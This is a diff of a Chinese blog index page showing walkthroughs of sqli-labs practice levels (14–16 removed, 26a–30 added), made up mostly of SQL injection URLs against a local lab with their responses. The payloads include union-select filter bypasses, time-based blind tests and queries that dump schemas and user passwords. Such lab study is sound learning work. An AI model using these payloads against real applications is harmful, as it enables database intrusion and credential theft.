@@ -69,10 +69,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-sqli-labs16" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs30" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs16/" class="article-date">
-  <time datetime="2020-04-06T05:46:02.008Z" itemprop="datePublished">2020-04-06</time>
+    <a href="/2020/05/04/sqli-labs30/" class="article-date">
+  <time datetime="2020-05-04T06:46:43.935Z" itemprop="datePublished">2020-05-04</time>
 </a>
     
   <div class="article-category">
@@ -87,7 +87,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs16/">Sqli-Labs-Level16学习</a>
+      <a class="article-title" href="/2020/05/04/sqli-labs30/">Sqli-Labs-Level30学习</a>
     </h1>
   
 
@@ -95,18 +95,20 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h1><p>创建日期 星期六 24 十一月 2018</p>
-<p><a href="http://127.0.0.1/sql/Less-16/" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-16/</a></p>
-<p>admin”) and 1#<br>密码任意，登录成功</p>
-<p>基于双引号的bool型盲注。</p>
-<p>admin”) and if(ascii(substr(database(),1,1))=1115,1,sleep(5))#<br>等待五秒返回</p>
-<p>admin”) and if(ascii(substr(database(),1,1))=115,1,sleep(5))#<br>登录成功</p>
-<p>其他语句类似。</p>
+        <p>level-30</p>
+<p><a href="http://192.168.244.129:520/Less-30/?id=1" target="_blank" rel="noopener">http://192.168.244.129:520/Less-30/?id=1</a></p>
+<p><a href="http://192.168.244.129:520/Less-30/?id=1%27" target="_blank" rel="noopener">http://192.168.244.129:520/Less-30/?id=1%27</a><br>Welcome    Dhakkan<br>Your Login name:Dumb<br>Your Password:Dumb</p>
+<p><a href="http://192.168.244.129:520/Less-30/?id=1%22" target="_blank" rel="noopener">http://192.168.244.129:520/Less-30/?id=1%22</a><br>Welcome    Dhakkan </p>
+<p><a href="http://192.168.244.129:520/Less-30/?id=2%27&amp;&amp;%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-30/?id=2%27&amp;&amp;%271%27=%271</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:Angelina<br>Your Password:I-kill-you</p>
+<p>说明无括号。</p>
+<p><a href="http://192.168.244.129:520/Less-30/?id=-1%22union%0aselect%0a1,2,3%23" target="_blank" rel="noopener">http://192.168.244.129:520/Less-30/?id=-1%22union%0aselect%0a1,2,3%23</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:3</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs16/" data-id="ck8o2c3ba000f8ch5hptxejqj" class="article-share-link">Share</a>
+      <a data-url="http://www.yi-diandian.com/2020/05/04/sqli-labs30/" data-id="ck9sla34o000hpwh59oore8cr" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
@@ -118,10 +120,10 @@
 
 
   
-    <article id="post-sqli-labs15" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs29" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs15/" class="article-date">
-  <time datetime="2020-04-06T05:45:40.783Z" itemprop="datePublished">2020-04-06</time>
+    <a href="/2020/05/04/sqli-labs29/" class="article-date">
+  <time datetime="2020-05-04T06:34:03.851Z" itemprop="datePublished">2020-05-04</time>
 </a>
     
   <div class="article-category">
@@ -136,7 +138,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs15/">Sqli-Labs-Level15学习</a>
+      <a class="article-title" href="/2020/05/04/sqli-labs29/">Sqli-Labs-Level29学习</a>
     </h1>
   
 
@@ -144,17 +146,17 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h1><p>创建日期 星期六 24 十一月 2018</p>
-<p><a href="http://127.0.0.1/sql/Less-15/" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-15/</a></p>
-<p>admin’ and 1#<br>密码任意<br>.\pasted_image.png</p>
-<p>admin’ and if(ascii(substr(database(),1,1))=115,1,sleep(5))#<br>密码任意 直接登录成功</p>
-<p>如果不是115，则等待5秒返回。</p>
-<p>其他语句类似。</p>
+        <p>level-29</p>
+<p><a href="http://192.168.244.129:520/Less-29/?id=1" target="_blank" rel="noopener">http://192.168.244.129:520/Less-29/?id=1</a></p>
+<p><a href="http://192.168.244.129:520/Less-29/?id=1%27" target="_blank" rel="noopener">http://192.168.244.129:520/Less-29/?id=1%27</a><br>Welcome    Dhakkan<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
+<p><a href="http://192.168.244.129:520/Less-29/?id=-1%27%20union%20select%201,2,3%23" target="_blank" rel="noopener">http://192.168.244.129:520/Less-29/?id=-1%27%20union%20select%201,2,3%23</a><br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:3</p>
+<p><a href="http://192.168.244.129:520/Less-29/?id=-1%27%20union%20select%201,2,database()%23" target="_blank" rel="noopener">http://192.168.244.129:520/Less-29/?id=-1%27%20union%20select%201,2,database()%23</a><br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:security</p>
+<p>其余语句类似。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://www.yi-diandian.com/2020/04/06/sqli-labs15/" data-id="ck8o2c3b8000a8ch570tt2mmm" class="article-share-link">Share</a>
+      <a data-url="http://www.yi-diandian.com/2020/05/04/sqli-labs29/" data-id="ck9sla34m000epwh5foizhyim" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
@@ -166,10 +168,10 @@
 
 
   
-    <article id="post-sqli-labs14" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-sqli-labs28a" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/04/06/sqli-labs14/" class="article-date">
-  <time datetime="2020-04-06T05:45:08.966Z" itemprop="datePublished">2020-04-06</time>
+    <a href="/2020/05/04/sqli-labs28a/" class="article-date">
+  <time datetime="2020-05-04T06:27:16.036Z" itemprop="datePublished">2020-05-04</time>
 </a>
     
   <div class="article-category">
@@ -184,7 +186,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2020/04/06/sqli-labs14/">Sqli-Labs-Level14学习</a>
+      <a class="article-title" href="/2020/05/04/sqli-labs28a/">Sqli-Labs-Level28a学习</a>
     </h1>
   
 
@@ -192,425 +194,474 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h1><p>创建日期 星期六 24 十一月 2018</p>
-<p><a href="http://127.0.0.1/sql/Less-14/" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-14/</a></p>
-<p>账号admin” and left(database(),1)&gt;’a’#<br>密码任意</p>
+        <p>level-28a</p>
+<p><a href="http://192.168.244.129:520/Less-28a/?id=1" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28a/?id=1</a></p>
+<p><a href="http://192.168.244.129:520/Less-28a/?id=1%27" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28a/?id=1%27</a><br>Welcome    Dhakkan </p>
+<p><a href="http://192.168.244.129:520/Less-28a/?id=1%27%0aand%20%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28a/?id=1%27%0aand%20%271%27=%271</a><br>Welcome    Dhakkan<br>Your Login name:Dumb<br>Your Password:Dumb</p>
+<p><a href="http://192.168.244.129:520/Less-28a/?id=1%27%0aand%20%271%27=%272" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28a/?id=1%27%0aand%20%271%27=%272</a><br>Welcome    Dhakkan </p>
+<p><a href="http://192.168.244.129:520/Less-28a/?id=100%27)%0aunionunion%0aselect%0aselect%0a1,2,3||%271%27=" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28a/?id=100%27)%0aunionunion%0aselect%0aselect%0a1,2,3||%271%27=</a>(%271<br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:1</p>
+<p><a href="http://192.168.244.129:520/Less-28a/?id=100%27)%0aunionunion%0aselect%0aselect%0a1,database(),3||%271%27=" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28a/?id=100%27)%0aunionunion%0aselect%0aselect%0a1,database(),3||%271%27=</a>(%271<br>OR<br><a href="http://192.168.244.129:520/Less-28a/?id=-1%27)%20uniounion%0aselectn%0aselect%0a1,database(),3%23" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28a/?id=-1%27)%20uniounion%0aselectn%0aselect%0a1,database(),3%23</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:security<br>Your Password:1</p>
+<p>其余语句类似。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/05/04/sqli-labs28a/" data-id="ck9sla34k000bpwh56a3g9xrl" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sqli-labs28" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/05/04/sqli-labs28/" class="article-date">
+  <time datetime="2020-05-04T06:04:56.951Z" itemprop="datePublished">2020-05-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/05/04/sqli-labs28/">Sqli-Labs-Level28学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>level-28</p>
+<p><a href="http://192.168.244.129:520/Less-28/?id=1" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28/?id=1</a></p>
+<p><a href="http://192.168.244.129:520/Less-28/?id=1%27" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28/?id=1%27</a><br>Welcome    Dhakkan </p>
+<p><a href="http://192.168.244.129:520/Less-28/?id=1%22" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28/?id=1%22</a><br>Welcome    Dhakkan<br>Your Login name:Dumb<br>Your Password:Dumb</p>
+<p><a href="http://192.168.244.129:520/Less-28/?id=1%22%0auNIon%0aSeLEct%0a1,2,3||%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28/?id=1%22%0auNIon%0aSeLEct%0a1,2,3||%271%27=%271</a><br>or<br><a href="http://192.168.244.129:520/Less-28/?id=1%27%0auNIon%0aSeLEct%0a1,2,3||%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28/?id=1%27%0auNIon%0aSeLEct%0a1,2,3||%271%27=%271</a></p>
+<p>Welcome    Dhakkan </p>
+<p>Hint: Your Input is Filtered with following result: 1” 1,2,3||’1’=’1</p>
+<p>发现大小写的union select 被过滤。</p>
+<p><a href="http://192.168.244.129:520/Less-28/?id=1%27)union||%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28/?id=1%27)union||%271%27=%271</a><br>Hint: Your Input is Filtered with following result: 1’)union||’1’=’1</p>
+<p><a href="http://192.168.244.129:520/Less-28/?id=1%27)select||%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28/?id=1%27)select||%271%27=%271</a><br>Hint: Your Input is Filtered with following result: 1’)select||’1’=’1</p>
+<p>即单独的union，select 不会被过滤，但如果与空格同时出现，则会被过滤。</p>
+<p>构造语句<br><a href="http://192.168.244.129:520/Less-28/?id=100%27)%0aunion%0aunion%0aselect%0aselect%0a1,2,3||%271%27=" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28/?id=100%27)%0aunion%0aunion%0aselect%0aselect%0a1,2,3||%271%27=</a>(%271<br>OR<br><a href="http://192.168.244.129:520/Less-28/?id=100%27)%0aunion%0aunion%0aselectselect%0a1,2,3||%271%27=" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28/?id=100%27)%0aunion%0aunion%0aselectselect%0a1,2,3||%271%27=</a>(%271</p>
+<p>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:1</p>
+<p><a href="http://192.168.244.129:520/Less-28/?id=100%27)%0aunion%0aunion%0aselect%0aselect%0a1,database(),3||%271%27=" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28/?id=100%27)%0aunion%0aunion%0aselect%0aselect%0a1,database(),3||%271%27=</a>(%271<br>OR<br><a href="http://192.168.244.129:520/Less-28/?id=100%27)%0aunion%0aunion%0aselectselect%0a1,database(),3||%271%27=" target="_blank" rel="noopener">http://192.168.244.129:520/Less-28/?id=100%27)%0aunion%0aunion%0aselectselect%0a1,database(),3||%271%27=</a>(%271</p>
+<p>Welcome    Dhakkan<br>Your Login name:security<br>Your Password:1</p>
+<p>其余语句类似。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/05/04/sqli-labs28/" data-id="ck9sla34i0008pwh5703n56fb" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sqli-labs27a" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/05/04/sqli-labs27a/" class="article-date">
+  <time datetime="2020-05-04T05:51:51.443Z" itemprop="datePublished">2020-05-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/05/04/sqli-labs27a/">Sqli-Labs-Level27a学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>level-27a</p>
+<p><a href="http://192.168.244.129:520/Less-27a/?id=1" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27a/?id=1</a></p>
+<p><a href="http://192.168.244.129:520/Less-27a/?id=1%27" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27a/?id=1%27</a><br>Welcome    Dhakkan<br>Your Login name:Dumb<br>Your Password:Dumb</p>
+<p><a href="http://192.168.244.129:520/Less-27a/?id=1%22" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27a/?id=1%22</a><br>Welcome    Dhakkan </p>
+<p><a href="http://192.168.244.129:520/Less-27a/?id=#1" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27a/?id=#1</a><br>Welcome    Dhakkan </p>
+<p><a href="http://192.168.244.129:520/Less-27a/?id=1%22%22" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27a/?id=1%22%22</a><br>Welcome    Dhakkan<br>Your Login name:Dumb<br>Your Password:Dumb</p>
+<p><a href="http://192.168.244.129:520/Less-27a/?id=100%22%0aUNIon%0aSeLecT%0a1,2,3||%221%22=%221" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27a/?id=100%22%0aUNIon%0aSeLecT%0a1,2,3||%221%22=%221</a><br>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:1</p>
+<p><a href="http://192.168.244.129:520/Less-27a/?id=100%22%0aUNIon%0aSeLecT%0a1,database(),3||%221%22=%221" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27a/?id=100%22%0aUNIon%0aSeLecT%0a1,database(),3||%221%22=%221</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:security<br>Your Password:1</p>
+<p><a href="http://192.168.244.129:520/Less-27a/?id=100%22%0aUNIon%0aSeLecT%0a1,(seleCT%0agroup_concat(schema_name)%0afrom%0ainformation_schema.schemata),3||%221%22=%221" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27a/?id=100%22%0aUNIon%0aSeLecT%0a1,(seleCT%0agroup_concat(schema_name)%0afrom%0ainformation_schema.schemata),3||%221%22=%221</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:information_schema,challenges,mysql,performance_schema,security<br>Your Password:1</p>
+<p>其余爆表爆字段 语句类似。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/05/04/sqli-labs27a/" data-id="ck9sla34h0005pwh5hi7676e0" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sqli-labs27" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/27/sqli-labs27/" class="article-date">
+  <time datetime="2020-04-27T11:52:15.645Z" itemprop="datePublished">2020-04-27</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/27/sqli-labs27/">Sqli-Labs-Level27学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>level-27</p>
+<p><a href="http://192.168.244.129:520/Less-27/?id=1" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27/?id=1</a></p>
+<p>这一关需要在linux下搭建sqli-labs才能注入成功。</p>
+<p>我这里使用的是kali下docker搭建sqli-labs，可参考<br><a href="https://www.cnblogs.com/Feng-L/p/12367640.html" target="_blank" rel="noopener">在Kali linux下使用docker配置sqli-labs（国内源的配置和系统软件更新）
+</a></p>
+<p><a href="http://192.168.244.129:888/Less-27/?id=1%27" target="_blank" rel="noopener">http://192.168.244.129:888/Less-27/?id=1%27</a></p>
+<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p>
+<p><a href="http://192.168.244.129:888/Less-27/?id=1%22" target="_blank" rel="noopener">http://192.168.244.129:888/Less-27/?id=1%22</a><br>Welcome    Dhakkan<br>Your Login name:Dumb<br>Your Password:Dumb</p>
+<h3 id="判断小括号有以下几种方法："><a href="#判断小括号有以下几种方法：" class="headerlink" title="判断小括号有以下几种方法："></a>判断小括号有以下几种方法：</h3><p><strong>1）提交2’&amp;&amp;’1’=’1</strong></p>
+<pre><code>若查询语句为where id=&apos;$id&apos;，查询时是where id=&apos;2&apos;&amp;&amp;&apos;1&apos;=&apos;1&apos;，结果是where id=&apos;2&apos;，回显会是id=2。
+
+若查询语句为where id=(&apos;$id&apos;)，查询时是where id=(&apos;2&apos;&amp;&amp;&apos;1&apos;=&apos;1&apos;)，MySQL 将&apos;2&apos;作为了 Bool 值，结果是where id=(&apos;1&apos;)，回显会是id=1。</code></pre><p><strong>2） 1’)||’1’=(‘1</strong><br>若查询语句有小括号正确回显，若无小括号错误回显（无回显）。</p>
+<p>作者：Hyafinthus<br>链接：<a href="https://www.jianshu.com/p/ff72f2c6d99c" target="_blank" rel="noopener">https://www.jianshu.com/p/ff72f2c6d99c</a></p>
+<p><a href="http://192.168.244.129:888/Less-27/?id=2%27&amp;&amp;%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:888/Less-27/?id=2%27&amp;&amp;%271%27=%271</a></p>
+<p>Welcome    Dhakkan<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’2’’ LIMIT 0,1’ at line 1</p>
+<p>?id=1’||’1’=’1</p>
+<p><a href="http://192.168.244.129:888/Less-27/?id=1%27||%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:888/Less-27/?id=1%27||%271%27=%271</a></p>
+<p>得到<br>Welcome    Dhakkan<br>Your Login name:Dumb<br>Your Password:Dumb</p>
+<p>提交<br><a href="http://192.168.244.129:888/Less-27/?id=1%27union%0aselect%0a1,2,3||%271%27=%272" target="_blank" rel="noopener">http://192.168.244.129:888/Less-27/?id=1%27union%0aselect%0a1,2,3||%271%27=%272</a></p>
+<p>Welcome    Dhakkan<br>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘1,2,3||’1’=’2’ LIMIT 0,1’ at line 3</p>
+<p>语句被过滤：</p>
+<p>Hint: Your Input is Filtered with following result: 1’ 1,2,3||’1’=’2</p>
+<p><a href="http://192.168.244.129:520/Less-27/?id=200%27%0AuNion%0ASeLect%0A1,2,3||%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27/?id=200%27%0AuNion%0ASeLect%0A1,2,3||%271%27=%271</a><br>OR<br><a href="http://192.168.244.129:520/Less-27/?id=200%27%0auNion%0aSeLect%0a1,2,3||%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27/?id=200%27%0auNion%0aSeLect%0a1,2,3||%271%27=%271</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:1</p>
+<p><a href="http://192.168.244.129:520/Less-27/?id=200%27%0auNion%0aSeLect%0a1,database(),3||%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27/?id=200%27%0auNion%0aSeLect%0a1,database(),3||%271%27=%271</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:security<br>Your Password:1</p>
+<p>输入<br><a href="http://192.168.244.129:520/Less-27/?id=200%27%0auNion%0aSeLect%0a1,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database(),3||%271%27=%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27/?id=200%27%0auNion%0aSeLect%0a1,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=database(),3||%271%27=%271</a></p>
+<p>语句被过滤为：</p>
+<p>Hint: Your Input is Filtered with following result: 200’ uNion SeLect 1,group_concat(table_name) from information_schema.tables where table_schema=database(),3||’1’=’1</p>
+<p>正确获取表的语句：</p>
+<p><a href="http://192.168.244.129:520/Less-27/?id=0%27%0aUnIoN%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=%27security%27),3||%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27/?id=0%27%0aUnIoN%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=%27security%27),3||%271</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:emails,referers,uagents,users<br>Your Password:1</p>
+<p>获取字段<br><a href="http://192.168.244.129:520/Less-27/?id=0%27%0aUnIoN%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=%27users%27),3||%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27/?id=0%27%0aUnIoN%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(column_name)%0afrom%0ainformation_schema.columns%0awhere%0atable_name=%27users%27),3||%271</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:id,username,password<br>Your Password:1</p>
+<p>获取值<br><a href="http://192.168.244.129:520/Less-27/?id=0%27%0aUnIoN%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(password)%0afrom%0ausers),3||%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27/?id=0%27%0aUnIoN%0aSeLeCt%0a1,(SeLeCt%0agroup_concat(password)%0afrom%0ausers),3||%271</a></p>
+<p>Welcome    Dhakkan<br>Your Login name:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4<br>Your Password:1</p>
+<p>输入<br><a href="http://192.168.244.129:520/Less-27/?id=0%27%0aUnIoN%0aSeLeCt%0a1,(SELecT%0agroup_concat(SCHEMA_NAME)%0aAS%0a`Database`%0aFROM%0aINFORMATION_SCHEMA.SCHEMATA),3||%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27/?id=0%27%0aUnIoN%0aSeLeCt%0a1,(SELecT%0agroup_concat(SCHEMA_NAME)%0aAS%0a`Database`%0aFROM%0aINFORMATION_SCHEMA.SCHEMATA),3||%271</a><br>OR<br><a href="http://192.168.244.129:520/Less-27/?id=0%27%0aUnIoN%0aSeLeCt%0a1,(SELecT%0agroup_concat(SCHEMA_NAME)%0aFROM%0aINFORMATION_SCHEMA.SCHEMATA),3||%271" target="_blank" rel="noopener">http://192.168.244.129:520/Less-27/?id=0%27%0aUnIoN%0aSeLeCt%0a1,(SELecT%0agroup_concat(SCHEMA_NAME)%0aFROM%0aINFORMATION_SCHEMA.SCHEMATA),3||%271</a></p>
+<p>获取所有数据库</p>
+<p>Welcome    Dhakkan<br>Your Login name:information_schema,challenges,mysql,performance_schema,security<br>Your Password:1</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://www.yi-diandian.com/2020/04/27/sqli-labs27/" data-id="ck9sla34f0003pwh5cn48apll" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Sqli-labs/" rel="tag">Sqli-labs</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sqli-labs26a" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/04/26/sqli-labs26a/" class="article-date">
+  <time datetime="2020-04-26T14:20:19.481Z" itemprop="datePublished">2020-04-26</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Sqli-Labs/">Sqli-Labs</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/04/26/sqli-labs26a/">Sqli-Labs-Level26a学习</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>level-26a</p>
+<p><a href="http://127.0.0.1/sql/Less-26a/?id=1" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26a/?id=1</a></p>
+<p><a href="http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,user(),3||" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,user(),3||</a>(%271</p>
+<p>或者<br><a href="http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,user()" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,user()</a>,(%273</p>
+<p>返回<br>Welcome    Dhakkan<br>Your Login name:root@localhost<br>Your Password:1</p>
+<p><a href="http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,database(),3||" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26a/?id=100%27)union%a0select%a01,database(),3||</a>(%271</p>
+<p>返回：<br>Welcome    Dhakkan<br>Your Login name:security<br>Your Password:1</p>
+<p>获取表：</p>
+<p><a href="http://127.0.0.1/sql/Less-26a/?id=-100%27)union%a0select%a01,2,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%a0%271%27=" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26a/?id=-100%27)union%a0select%a01,2,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%a0%271%27=</a>(%271</p>
+<p>或者<br><a href="http://127.0.0.1/sql/Less-26a/?id=-100%27)union%a0select%a01,2,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%a0" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-26a/?id=-100%27)union%a0select%a01,2,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=%27security%27%26%26%a0</a>(%271</p>
+<p>返回：</p>
+<p>Welcome    Dhakkan<br>Your Login name:2<br>Your Password:emails,referers,uagents,users</p>
+<p>获取字段</p>
